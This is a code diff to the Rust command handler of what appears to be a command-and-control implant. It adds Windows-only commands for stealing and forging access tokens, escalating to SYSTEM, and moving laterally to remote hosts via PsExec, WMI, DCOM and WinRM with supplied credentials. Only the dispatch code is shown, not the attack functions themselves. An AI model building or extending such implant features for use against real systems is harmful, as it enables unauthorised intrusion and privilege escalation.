@@ -561,6 +561,82 @@ pub async fn handle_command(
             SHUTDOWN_NOTIFY.notify_one();
             Ok("Agent shutdown sequence initiated".to_string())
         }
+
+        // ── Token Manipulation (Windows only) ─────────────────────────
+
+        #[cfg(windows)]
+        Command::MakeToken { ref username, ref password, ref domain, logon_type } => {
+            super::token_manipulation::make_token(username, password, domain, logon_type)
+                .map_err(|e| e.to_string())
+        }
+        #[cfg(not(windows))]
+        Command::MakeToken { .. } => Err("token manipulation requires Windows".to_string()),
+
+        #[cfg(windows)]
+        Command::StealToken { target_pid } => {
+            super::token_manipulation::steal_token(target_pid)
+                .map_err(|e| e.to_string())
+        }
+        #[cfg(not(windows))]
+        Command::StealToken { .. } => Err("token manipulation requires Windows".to_string()),
+
+        #[cfg(windows)]
+        Command::Rev2Self => {
+            super::token_manipulation::rev2self()
+                .map_err(|e| e.to_string())
+        }
+        #[cfg(not(windows))]
+        Command::Rev2Self => Err("token manipulation requires Windows".to_string()),
+
+        #[cfg(windows)]
+        Command::GetSystem => {
+            super::token_manipulation::get_system()
+                .map_err(|e| e.to_string())
+        }
+        #[cfg(not(windows))]
+        Command::GetSystem => Err("token manipulation requires Windows".to_string()),
+
+        // ── Lateral Movement (Windows only) ───────────────────────────
+
+        #[cfg(windows)]
+        Command::PsExec { ref target_host, ref command, ref username, ref password } => {
+            let user = username.as_deref();
+            let pass = password.as_deref();
+            super::lateral_movement::psexec_exec(target_host, command, user, pass)
+                .map_err(|e| e.to_string())
+        }
+        #[cfg(not(windows))]
+        Command::PsExec { .. } => Err("lateral movement requires Windows".to_string()),
+
+        #[cfg(windows)]
+        Command::WmiExec { ref target_host, ref command, ref username, ref password } => {
+            let user = username.as_deref();
+            let pass = password.as_deref();
+            super::lateral_movement::wmi_exec(target_host, command, user, pass)
+                .map_err(|e| e.to_string())
+        }
+        #[cfg(not(windows))]
+        Command::WmiExec { .. } => Err("lateral movement requires Windows".to_string()),
+
+        #[cfg(windows)]
+        Command::DcomExec { ref target_host, ref command, ref username, ref password } => {
+            let user = username.as_deref();
+            let pass = password.as_deref();
+            super::lateral_movement::dcom_exec(target_host, command, user, pass)
+                .map_err(|e| e.to_string())
+        }
+        #[cfg(not(windows))]
+        Command::DcomExec { .. } => Err("lateral movement requires Windows".to_string()),
+
+        #[cfg(windows)]
+        Command::WinRmExec { ref target_host, ref command, ref username, ref password } => {
+            let user = username.as_deref();
+            let pass = password.as_deref();
+            super::lateral_movement::winrm_exec(target_host, command, user, pass).await
+                .map_err(|e| e.to_string())
+        }
+        #[cfg(not(windows))]
+        Command::WinRmExec { .. } => Err("lateral movement requires Windows".to_string()),
     };
 
     let (outcome, details) = match &result {
